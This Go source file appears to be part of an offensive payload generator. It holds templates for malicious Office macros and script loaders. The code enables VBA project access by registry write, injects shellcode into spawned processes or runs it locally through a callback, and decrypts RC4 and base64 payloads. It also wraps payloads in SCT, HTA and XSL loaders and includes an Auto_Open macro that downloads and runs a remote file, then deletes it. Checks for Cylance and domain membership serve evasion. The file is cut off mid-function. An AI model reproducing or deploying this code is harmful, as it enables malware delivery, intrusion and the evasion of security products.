package Struct

func Javacode_Start_Excel() string {
	return `try {
	var {{.Variables.objOffice}} = new ActiveXObject("Excel.Application");
	{{.Variables.objOffice}}.Visible = false;
	var {{.Variables.WshShell}} = new ActiveXObject("WScr"+"ipt.Shell");
	var {{.Variables.Application_Version}} = {{.Variables.objOffice}}.Version;
	var {{.Variables.strRegPath}} = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\Excel\\Security\\AccessVBOM";
	{{.Variables.WshShell}}.RegWrite({{.Variables.strRegPath}}, 1, "REG_DWORD");
	var {{.Variables.objWorkbook}} = {{.Variables.objOffice}}.Workbooks.Add();
	var {{.Variables.xlmodule}} = {{.Variables.objWorkbook}}.VBProject.VBComponents.Add(1);

`
}

func Javacode_Start_Word() string {
	return `try {
	var {{.Variables.objOffice}} = new ActiveXObject("Word.Application");
	{{.Variables.objOffice}}.Visible = false;
	var {{.Variables.WshShell}} = new ActiveXObject("WScr"+"ipt.Shell");
	var {{.Variables.Application_Version}} = {{.Variables.objOffice}}.Version;
	var {{.Variables.strRegPath}} = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\Word\\Security\\AccessVBOM";
	{{.Variables.WshShell}}.RegWrite({{.Variables.strRegPath}}, 1, "REG_DWORD");
	var {{.Variables.objWorkbook}} = {{.Variables.objOffice}}.Documents.Add();
	var {{.Variables.xlmodule}} = {{.Variables.objWorkbook}}.VBProject.VBComponents.Add(1);
`
}

func Javacode_Start_PowerPoint() string {
	return `try {
	var {{.Variables.objOffice}} = new ActiveXObject("PowerPoint.Application");
	{{.Variables.objOffice}}.Visible = false;
	var {{.Variables.WshShell}} = new ActiveXObject("WScr"+"ipt.Shell");
	var {{.Variables.Application_Version}} = {{.Variables.obj}}.Version;
	var {{.Variables.strRegPath}} = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + {{.Variables.Application_Version}} + "\\PowerPoint\\Security\\AccessVBOM";
	{{.Variables.WshShell}}.RegWrite({{.Variables.strRegPath}}, 1, "REG_DWORD");
	var {{.Variables.objWorkbook}} = {{.Variables.objOffice}}.Documents.Add();
	var {{.Variables.xlmodule}} = {{.Variables.objWorkbook}}.VBProject.VBComponents.Add(1);
`
}

func VBA_Decode() string {

	return `	{{.Variables.shellcode}} += 'Function {{.Variables.xorFunction}}({{.Variables.xorText}}) As String\n';
	{{.Variables.shellcode}} += '	{{.Variables.xorKey}} = "{{.Variables.VBAKey}}"\n';
	{{.Variables.shellcode}} += '	For {{.Variables.xorI}} = 1 to len({{.Variables.xorText}})\n';
	{{.Variables.shellcode}} += '		{{.Variables.xorA}} = {{.Variables.xorI}} mod len({{.Variables.xorKey}})\n';
	{{.Variables.shellcode}} += '		if {{.Variables.xorA}} = 0 then \n';
	{{.Variables.shellcode}} += '		  {{.Variables.xorA}} = len({{.Variables.xorKey}})\n';
	{{.Variables.shellcode}} += '		end if\n';
	{{.Variables.shellcode}} += '		{{.Variables.xorFunction}} = {{.Variables.xorFunction}} & chr(asc(mid({{.Variables.xorKey}},{{.Variables.xorA}},1)) xor asc(mid({{.Variables.xorText}},{{.Variables.xorI}},1)))\n';
	{{.Variables.shellcode}} += '	Next\n';
	{{.Variables.shellcode}} += '   Dim vbComp As Object\n';
	{{.Variables.shellcode}} += '   Set vbComp = ThisWorkbook.VBProject.VBComponents.Add(1)\n';
	{{.Variables.shellcode}} += '   vbComp.CodeModule.AddFromString "" & {{.Variables.xorFunction}} & ""\n';
	{{.Variables.shellcode}} += '   Application.Run vbComp.Name & ".{{.Variables.Function}}"\n';
	{{.Variables.shellcode}} += 'end Function\n';
	{{.Variables.shellcode}} += 'Function {{.Variables.hexDecodeFunction}}({{.Variables.hexInput}}) As String\n';
	{{.Variables.shellcode}} += '  For {{.Variables.hexI}} = 1 to len({{.Variables.hexInput}}) Step 2\n';
	{{.Variables.shellcode}} += '    {{.Variables.hexDecodeFunction}} = {{.Variables.hexDecodeFunction}} & Chr("&H" & mid({{.Variables.hexInput}}, {{.Variables.hexI}}, 2))\n';
	{{.Variables.shellcode}} += '  Next\n';
	{{.Variables.shellcode}} += '  {{.Variables.DecodedValue}} = {{.Variables.hexDecodeFunction}}\n'; 
	{{.Variables.shellcode}} += 'end Function\n';`
}
func Process_Inject() string {
	return `

Private Type PROCESS_INFORMATION
hProcess As Long
hThread As Long
dwProcessId As Long
dwThreadId As Long
End Type
Private Type STARTUPINFO
cb As Long
lpReserved As String
lpDesktop As String
lpTitle As String
dwX As Long
dwY As Long
dwXSize As Long
dwYSize As Long
dwXCountChars As Long
dwYCountChars As Long
dwFillAttribute As Long
dwFlags As Long 
wShowWindow As Integer
cbReserved2 As Integer
lpReserved2 As Long
hStdInput As Long
hStdOutput As Long
hStdError As Long
End Type
#If VBA7 Then
Private Declare PtrSafe Function {{.Variables.CreateStuff}} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
Private Declare PtrSafe Function {{.Variables.AllocStuff}} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function {{.Variables.WriteStuff}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
Private Declare PtrSafe Function {{.Variables.RunStuff}} Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
Private Declare Function {{.Variables.CreateStuff}} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
Private Declare Function {{.Variables.AllocStuff}} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function {{.Variables.WriteStuff}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
Private Declare Function {{.Variables.RunStuff}} Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If
Sub {{.Variables.Function}}()
Dim {{.Variables.myByte}} As Long, {{.Variables.myArray}} As Variant, {{.Variables.offset}} As Long
Dim {{.Variables.pInfo}} As PROCESS_INFORMATION
Dim {{.Variables.sInfo}} As STARTUPINFO
Dim {{.Variables.sNull}} As String
Dim {{.Variables.sProc}} As String
#If VBA7 Then
Dim {{.Variables.rwxpage}} As LongPtr, {{.Variables.res}} As LongPtr
#Else
Dim {{.Variables.rwxpage}} As Long, {{.Variables.res}} As Long
#End If
{{.Variables.myArray}} = {{.Variables.VBACode32}}
If Len(Environ("ProgramW6432")) > 0 Then
{{.Variables.sProc}} = Environ("windir") & "\\SysWOW64\\{{.Variables.process32}}"
Else
{{.Variables.sProc}} = Environ("windir") & "\\System32\\{{.Variables.process32}}"
End If 
{{.Variables.res}} = {{.Variables.RunStuff}}({{.Variables.sNull}}, {{.Variables.sProc}}, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, {{.Variables.sNull}}, {{.Variables.sInfo}}, {{.Variables.pInfo}})
{{.Variables.rwxpage}} = {{.Variables.AllocStuff}}({{.Variables.pInfo}}.hProcess, 0, UBound({{.Variables.myArray}}), &H1000, &H40)
For {{.Variables.offset}} = LBound({{.Variables.myArray}}) To UBound({{.Variables.myArray}})
{{.Variables.myByte}} = {{.Variables.myArray}}({{.Variables.offset}})
{{.Variables.res}} = {{.Variables.WriteStuff}}({{.Variables.pInfo}}.hProcess, {{.Variables.rwxpage}} + {{.Variables.offset}}, {{.Variables.myByte}}, 1, ByVal 0&)
Next {{.Variables.offset}}
{{.Variables.res}} = {{.Variables.CreateStuff}}({{.Variables.pInfo}}.hProcess, 0, 0, {{.Variables.rwxpage}}, 0, 0, 0)
End Sub`
}

func Stageless_Process_Inject() string {
	return `
Public {{.Variables.EncodedPayload}} As String
Public {{.Variables.DecodedValue}} As String
Private Type PROCESS_INFORMATION
hProcess As Long
hThread As Long
dwProcessId As Long
dwThreadId As Long
End Type
Private Type STARTUPINFO
cb As Long
lpReserved As String
lpDesktop As String
lpTitle As String
dwX As Long
dwY As Long
dwXSize As Long
dwYSize As Long
dwXCountChars As Long
dwYCountChars As Long
dwFillAttribute As Long
dwFlags As Long 
wShowWindow As Integer
cbReserved2 As Integer
lpReserved2 As Long
hStdInput As Long
hStdOutput As Long
hStdError As Long
End Type
#If VBA7 Then
Private Declare PtrSafe Function {{.Variables.CreateStuff}} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
Private Declare PtrSafe Function {{.Variables.AllocStuff}} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function {{.Variables.WriteStuff}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
Private Declare PtrSafe Function {{.Variables.RunStuff}} Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
Private Declare Function {{.Variables.CreateStuff}} Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
Private Declare Function {{.Variables.AllocStuff}} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function {{.Variables.WriteStuff}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
Private Declare Function {{.Variables.RunStuff}} Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If
Sub {{.Variables.Function}}()
Dim {{.Variables.myByte}} As Long, {{.Variables.myArray}} As Variant, {{.Variables.offset}} As Long
Dim {{.Variables.pInfo}} As PROCESS_INFORMATION
Dim {{.Variables.sInfo}} As STARTUPINFO
Dim {{.Variables.sNull}} As String
Dim {{.Variables.sProc}} As String
#If VBA7 Then
Dim {{.Variables.rwxpage}} As LongPtr, {{.Variables.res}} As LongPtr
#Else
Dim {{.Variables.rwxpage}} As Long, {{.Variables.res}} As Long
#End If
Dim {{.Variables.val}}
{{.Variables.val}} = Len(Environ("ProgramFiles") & "\\Cylance\\") 
#If {{.Variables.val}} >1 then 
	{{.Variables.VBACode32}}
If Len(Environ("ProgramW6432")) > 0 Then
{{.Variables.sProc}} = Environ("windir") & "\\SysWOW64\\{{.Variables.process32}}"
Else
{{.Variables.sProc}} = Environ("windir") & "\\System32\\{{.Variables.process32}}"

#ElseIf Win64 Then 
	{{.Variables.VBACode64}}
{{.Variables.sProc}} = {{.Variables.process64}}

#Else

	{{.Variables.VBACode32}}
If Len(Environ("ProgramW6432")) > 0 Then
{{.Variables.sProc}} = Environ("windir") & "\\SysWOW64\\{{.Variables.process32}}"
Else
{{.Variables.sProc}} = Environ("windir") & "\\System32\\{{.Variables.process32}}"

end if 
#End if
{{.Variables.myArray}} = split({{.Variables.EncodedPayload}}, ",")
{{.Variables.res}} = {{.Variables.RunStuff}}({{.Variables.sNull}}, {{.Variables.sProc}}, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, {{.Variables.sNull}}, {{.Variables.sInfo}}, {{.Variables.pInfo}})
{{.Variables.rwxpage}} = {{.Variables.AllocStuff}}({{.Variables.pInfo}}.hProcess, 0, UBound({{.Variables.myArray}}), &H1000, &H40)
For {{.Variables.offset}} = LBound({{.Variables.myArray}}) To UBound({{.Variables.myArray}})
{{.Variables.myByte}} = {{.Variables.myArray}}({{.Variables.offset}})
{{.Variables.res}} = {{.Variables.WriteStuff}}({{.Variables.pInfo}}.hProcess, {{.Variables.rwxpage}} + {{.Variables.offset}}, {{.Variables.myByte}}, 1, ByVal 0&)
Next {{.Variables.offset}}
{{.Variables.res}} = {{.Variables.CreateStuff}}({{.Variables.pInfo}}.hProcess, 0, 0, {{.Variables.rwxpage}}, 0, 0, 0)
End Sub
Sub {{.Variables.Auto_Open}}()
{{.Variables.Function}}
End Sub

	`
}

func Thread_Spawn() string {
	return `
#If VBA7 Then
Private Declare PtrSafe Function {{.Variables.allocateMemory}} Lib "ntdll" Alias "NtAllocateVirtualMemory" (ProcessHandle As LongPtr, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As LongPtr, ByVal AllocationType As Long, ByVal Protect As Long) As LongPtr
Private Declare PtrSafe Function {{.Variables.copyMemory}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As Any, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
Private Declare PtrSafe Function {{.Variables.shellExecute}} Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long

#Else
Private Declare Function {{.Variables.allocateMemory}} Lib "ntdll" Alia  "NtAllocateVirtualMemory" (ProcessHandle As Long, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
Private Declare Function {{.Variables.copyMemory}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
Private Declare Function {{.Variables.shellExecute}} Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
#End If
	
Private Sub {{.Variables.Function}}()
#If VBA7 Then
Dim {{.Variables.memoryAddress}} As LongPtr
Dim {{.Variables.rL}} As LongPtr
#Else
Dim {{.Variables.memoryAddress}} As Long
Dim {{.Variables.rL}} As Long
#End If
Dim {{.Variables.rawshellCode}} As String
Dim {{.Variables.shellLength}} As Long
Dim {{.Variables.ByteArray}}() As Byte
Dim {{.Variables.zL}} As Long
{{.Variables.zL}} = 0
#If Win64 Then 
{{.Variables.splitrawshellcode64}}
#Else
{{.Variables.splitrawshellcode32}}
#End if

{{.Variables.shellLength}} = Len({{.Variables.rawshellCode}}) / 2
ReDim {{.Variables.ByteArray}}(0 To {{.Variables.shellLength}})
For i = 0 to {{.Variables.shellLength}} - 1
	If i = 0 Then
		{{.Variables.pos}} = i + 1
	Else
		{{.Variables.pos}} = i * 2 + 1
	End If
		{{.Variables.Value}} = Mid({{.Variables.rawshellCode}}, {{.Variables.pos}}, 2)
		{{.Variables.ByteArray}}(i) = Val("&H" & {{.Variables.Value}})
Next
{{.Variables.memoryAddress}} = {{.Variables.allocateMemory}}(ByVal -1, {{.Variables.rL}}, {{.Variables.zL}}, &H90000, &H1000, &H40)
{{.Variables.memoryAddress}} = {{.Variables.rL}}
{{.Variables.copyMemory}} ByVal -1, {{.Variables.memoryAddress}}, VarPtr({{.Variables.ByteArray}}(0)), UBound({{.Variables.ByteArray}}) + 1, {{.Variables.zL}}
{{.Variables.excuteResult}} = {{.Variables.shellExecute}}({{.Variables.memoryAddress}}, {{.Variables.zL}}) 
End Sub
`
}

func Stageless_Local_Spawn() string {
	return `
	Public {{.Variables.EncodedPayload}} As String
	Public {{.Variables.DecodedValue}} As String
	#If VBA7 Then
	Private Declare PtrSafe Function {{.Variables.allocateMemory}} Lib "ntdll" Alias "NtAllocateVirtualMemory" (ProcessHandle As LongPtr, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As LongPtr, ByVal AllocationType As Long, ByVal Protect As Long) As LongPtr
	Private Declare PtrSafe Function {{.Variables.copyMemory}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As Any, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
	Private Declare PtrSafe Function {{.Variables.shellExecute}} Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
	#Else
	Private Declare Function {{.Variables.allocateMemory}} Lib "ntdll" Alias  "NtAllocateVirtualMemory" (ProcessHandle As Long, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
	Private Declare Function {{.Variables.copyMemory}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
	Private Declare Function {{.Variables.shellExecute}} Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
	#End If
	
	Private Sub {{.Variables.Function}}()
	#If VBA7 Then
	Dim {{.Variables.memoryAddress}} As LongPtr
	Dim {{.Variables.rL}} As LongPtr
	#Else
	Dim {{.Variables.memoryAddress}} As Long
	Dim {{.Variables.rL}} As Long
	#End If
	Dim {{.Variables.rawshellCode}} As String
	Dim {{.Variables.shellLength}} As Long
	Dim {{.Variables.ByteArray}}() As Byte
	Dim {{.Variables.zL}} As Long
	{{.Variables.zL}} = 0
	#If Win64 Then
	{{.Variables.splitrawshellcode64}}
	#Else
	{{.Variables.splitrawshellcode32}}
	#End if 
	 
	{{.Variables.shellLength}} = Len({{.Variables.rawshellCode}}) / 2
	ReDim {{.Variables.ByteArray}}(0 To {{.Variables.shellLength}})
	For i = 0 to {{.Variables.shellLength}} - 1
	    If i = 0 Then
	            {{.Variables.pos}} = i + 1
	    Else
	            {{.Variables.pos}} = i * 2 + 1
	    End If
	            {{.Variables.Value}} = Mid({{.Variables.rawshellCode}}, {{.Variables.pos}}, 2)
	            {{.Variables.ByteArray}}(i) = Val("&H" & {{.Variables.Value}})
	Next
	{{.Variables.memoryAddress}} = {{.Variables.allocateMemory}}(ByVal -1, {{.Variables.rL}}, {{.Variables.zL}}, &H90000, &H1000, &H40)
	{{.Variables.memoryAddress}} = {{.Variables.rL}}
	{{.Variables.copyMemory}} ByVal -1, {{.Variables.memoryAddress}}, VarPtr({{.Variables.ByteArray}}(0)), UBound({{.Variables.ByteArray}}) + 1, {{.Variables.zL}}
	{{.Variables.excuteResult}} = {{.Variables.shellExecute}}({{.Variables.memoryAddress}}, {{.Variables.zL}})
	End Sub
	Sub {{.Variables.Auto_Open}}()
		{{.Variables.Function}}
	End Sub
`
}

func Decode_Starter() string {
	return `	{{.Variables.shellcode}} += 'Sub {{.Variables.Auto_Open}}()\n';
	{{.Variables.shellcode}} += '	init\n';
	{{.Variables.shellcode}} += '	{{.Variables.hexDecodeFunction}}({{.Variables.EncodedPayload}})\n';
	{{.Variables.shellcode}} += '	{{.Variables.xorFunction}}({{.Variables.DecodedValue}})\n';
	{{.Variables.shellcode}} += 'End Sub\n';`
}

func Stageless_Decode_Starter() string {
	return `	{{.Variables.shellcode}} += 'Sub {{.Variables.Auto_Open}}()\n';
	{{.Variables.shellcode}} += '	{{.Variables.Function}}\n';
	{{.Variables.shellcode}} += 'End Sub\n';`
}

func End_Code() string {
	return `
	{{.Variables.xlmodule}}.CodeModule.AddFromString({{.Variables.shellcode}});
	{{.Variables.objOffice}}.DisplayAlerts = false;
	{{.Variables.objOffice}}.Run("{{.Variables.Auto_Open}}");
	{{.Variables.objWorkbook}}.Close(false);
	}
catch (err){
	}`
}

func SCT_Loader() string {
	return `<?XML version="1.0"?>
	<scriptlet>
	<registration
		progid="{{.Variables.progid}}"
		classid={{.Variables.classid}}"
		remotable="true"
		>
		</registration>
		<script language="JScript">
			<![CDATA[ {{.Variables.payload}}
			]]>
	</script>
	</scriptlet>
`
}

func HTA_Loader() string {
	return `<HTML>
	<HEAD>
	</HEAD>
	<BODY>
	<script language="javascript" >
	window.resizeTo(0,0);
	{{.Variables.payload}}
	window.close();
	</script>
	</BODY>
	</HTML>
`
}

func XSL_Loader() string {
	return `<?xml version='1.0'?>
	<stylesheet
	xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
	xmlns:user="placeholder"
	version="1.0">
	<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
		{{.Variables.payload}}
	]]> </ms:script>
	</stylesheet>
`
}

func Stagless_Decryption() string {
	return `	function {{.Variables.rc4}}({{.Variables.rc4key}}, {{.Variables.rc4str}}) {
		var s = [], j = 0, x, res = '';
		for (var i = 0; i < 256; i++) {
			s[i] = i;
		}
		for (i = 0; i < 256; i++) {
			j = (j + s[i] + {{.Variables.rc4key}}.charCodeAt(i % {{.Variables.rc4key}}.length)) % 256;
			x = s[i];
			s[i] = s[j];
			s[j] = x;
		}
		i = 0;
		j = 0;
		for (var y = 0; y < {{.Variables.rc4str}}.length; y++) {
			i = (i + 1) % 256;
			j = (j + s[i]) % 256;
			x = s[i];
			s[i] = s[j];
			s[j] = x;
			res += String.fromCharCode({{.Variables.rc4str}}.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
		}
		return res;
	}
	
	{{.Variables.decodeBase64}} = function(s) {
		var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
		var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		for(i=0;i<64;i++){e[A.charAt(i)]=i;}
		for(x=0;x<L;x++){
			c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
			while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
		}
		return r;
	};
	var {{.Variables.b4decoded}} = {{.Variables.decodeBase64}}("{{.Variables.b64payload}}");
	var {{.Variables.b4decodedkey}} = {{.Variables.decodeBase64}}("{{.Variables.b64key}}");
	var {{.Variables.shellcode}} = {{.Variables.rc4}}({{.Variables.b4decodedkey}},{{.Variables.b4decoded}});
`
}

func Macro() string {
	return `Sub Auto_Open()
    Dim {{.Variables.pathOfFile}} As String
    Dim {{.Variables.Full}} As String
    Dim {{.Variables.t}} As String
    {{.Variables.pathOfFile}} = Environ("AppData") & "\Microsoft\Excel\"
    VBA.ChDir {{.Variables.pathOfFile}}

    Dim {{.Variables.remoteFile}} As String
    Dim {{.Variables.storeIn}} As String
    Dim {{.Variables.HTTPReq}} As Object

    {{.Variables.remoteFile}} = "{{.Variables.URL}}{{.Variables.outFile}}"
    {{.Variables.storeIn}} = "{{.Variables.outFile}}"
    Set {{.Variables.HTTPReq}} = CreateObject("Microsoft.XMLHTTP")
    {{.Variables.HTTPReq}}.Open "GET", {{.Variables.remoteFile}}, False
    {{.Variables.HTTPReq}}.send

	If {{.Variables.HTTPReq}}.Status = 200 Then
        Set {{.Variables.output}} = CreateObject("ADODB.Stream")
        {{.Variables.output}}.Open
        {{.Variables.output}}.Type = 1
        {{.Variables.output}}.Write {{.Variables.HTTPReq}}.responseBody
        {{.Variables.output}}.SaveToFile {{.Variables.storeIn}}, 2
        {{.Variables.output}}.Close
    End If
    {{.Variables.Full}} = {{.Variables.pathOfFile}} & {{.Variables.storeIn}}
    Set {{.Variables.obj}} = GetObject("new:0006F03A-0000-0000-C000-000000000046")
	{{.Variables.obj}}.CreateObject("WScript.Shell").Run("c" & "s" & "c" & "r" & "i" & "p" & "t" & " //E:jscript " & {{.Variables.Full}}), 0
	{{.Variables.sleep}}
	Kill {{.Variables.Full}}
End Sub
Sub {{.Variables.sleep}}()
Dim when As Variant
    Debug.Print "Start " & Now
    when = Now + TimeValue("00:00:30")
    Do While when > Now
        DoEvents
    Loop
    Debug.Print "End " & Now
End Sub
`
}

func Sandbox() string {
	return `
	var {{.Variables.objShell}} = new ActiveXObject("Shell.Application")
	var {{.Variables.domain}} =  {{.Variables.objShell}}.GetSystemInformation("IsOS_DomainMember");
	if ({{.Variables.domain}} == 0 ){
	}
	else 
`
}

func Unhooked_Stageless_Local_Spawn() string {
	return `
	Public {{.Variables.EncodedPayload}} As String
	Public {{.Variables.DecodedValue}} As String
	#If VBA7 Then
	Private Declare PtrSafe Function {{.Variables.allocateMemory}} Lib "ntdll" Alias "NtAllocateVirtualMemory" (ProcessHandle As LongPtr, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As LongPtr, ByVal AllocationType As Long, ByVal Protect As Long) As LongPtr
	Private Declare PtrSafe Function {{.Variables.copyMemory}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As Any, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
	Private Declare PtrSafe Function {{.Variables.shellExecute}} Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
	Private Declare PtrSafe Function {{.Variables.GetProcAddress}}  Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
	Private Declare PtrSafe Function {{.Variables.GetModuleHandleA}} Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As LongPtr
	#Else
	Private Declare Function {{.Variables.allocateMemory}} Lib "ntdll" Alias  "NtAllocateVirtualMemory" (ProcessHandle As Long, BaseAddress As Any, ByVal ZeroBits As Long, RegionSize As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
	Private Declare Function {{.Variables.copyMemory}} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
	Private Declare Function {{.Variables.shellExecute}} Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
	Private Declare Function {{.Variables.GetProcAddress}}  Lib "kernel32" Alias "GetProcAddress" (ByVal hModule As Long, ByVal lpProcNamee As String) As Long
	Private Declare Function {{.Variables.GetModuleHandleA}} Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
	#End If
	
	Private Sub {{.Variables.Function}}()
	#If VBA7 Then
	Dim {{.Variables.memoryAddress}} As LongPtr
	Dim {{.Variables.rL}} As LongPtr
	#Else
	Dim {{.Variables.memoryAddress}} As Long
	Dim {{.Variables.rL}} As Long
	#End If
	Dim {{.Variables.rawshellCode}} As String
	Dim {{.Variables.shellLength}} As Long
	Dim {{.Variables.ByteArray}}() As Byte
	Dim {{.Variables.zL}} As Long
	{{.Variables.zL}} = 0
	#If Win64 Then 
	{{.Variables.splitrawshellcode64}}
	#Else
	{{.Variables.splitrawshellcode32}}
	#End if
	{{.Variables.LLib}}

	{{.Variables.shellLength}} = Len({{.Variables.rawshellCode}}) / 2
	ReDim {{.Variables.ByteArray}}(0 To {{.Variables.shellLength}})
	For i = 0 to {{.Variables.shellLength}} - 1
		If i = 0 Then
			{{.Variables.pos}} = i + 1
		Else
			{{.Variables.pos}} = i * 2 + 1
		End If
			{{.Variables.Value}} = Mid({{.Variables.rawshellCode}}, {{.Variables.pos}}, 2)
			{{.Variables.ByteArray}}(i) = Val("&H" & {{.Variables.Value}})
	Next
	{{.Variables.memoryAddress}} = {{.Variables.allocateMemory}}(ByVal -1, {{.Variables.rL}}, {{.Variables.zL}}, &H90000, &H1000, &H40)
	{{.Variables.memoryAddress}} = {{.Variables.rL}}
	{{.Variables.copyMemory}} ByVal -1, {{.Variables.memoryAddress}}, VarPtr({{.Variables.ByteArray}}(0)), UBound({{.Variables.ByteArray}}) + 1, {{.Variables.zL}}
	{{.Variables.excuteResult}} = {{.Variables.shellExecute}}({{.Variables.memoryAddress}}, {{.Variables.zL}}) 
